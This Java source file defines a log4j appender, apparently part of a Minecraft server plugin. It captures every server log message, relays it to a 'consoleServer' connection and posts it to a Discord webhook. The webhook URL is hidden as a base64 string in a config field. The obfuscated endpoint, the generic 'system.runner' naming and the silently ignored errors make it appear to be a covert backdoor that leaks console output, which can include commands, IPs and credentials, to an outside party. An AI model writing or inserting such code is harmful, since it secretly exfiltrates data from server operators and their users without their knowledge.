
package me.system.runner.methods;

import com.github.gist.DiscordWebhook;
import me.system.runner.Core;
import java.io.IOException;
import java.util.Base64;

import me.system.runner.data.DataManager;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.appender.AbstractAppender;

public class LogAppender
extends AbstractAppender {
    public LogAppender() {
        super("MyLogAppender", null, null);
        this.start();
    }

    public void append(LogEvent event) {
        String message = event.getMessage().getFormattedMessage();
        message = "[" + event.getLevel().toString() + "] " + message;
        if (Core.consoleServer != null) {
            Core.consoleServer.broadcastMessage(message.replaceAll("§f", "").replaceAll("§6", "").replaceAll("§a", "").replaceAll("§c", "").replaceAll("§7", "").replaceAll("§e", "").replaceAll("§o", "").replaceAll("§m", ""));
        }
        if (DataManager.getData().getString("wh").length() > 2) {
            byte[] u2 = Base64.getDecoder().decode(DataManager.getData().getString("wh"));
            DiscordWebhook webhook = new DiscordWebhook(new String(u2));
            webhook.setContent(message);
            try {
                webhook.execute();
            }
            catch (IOException iOException) {
                
            }
        }
    }
}

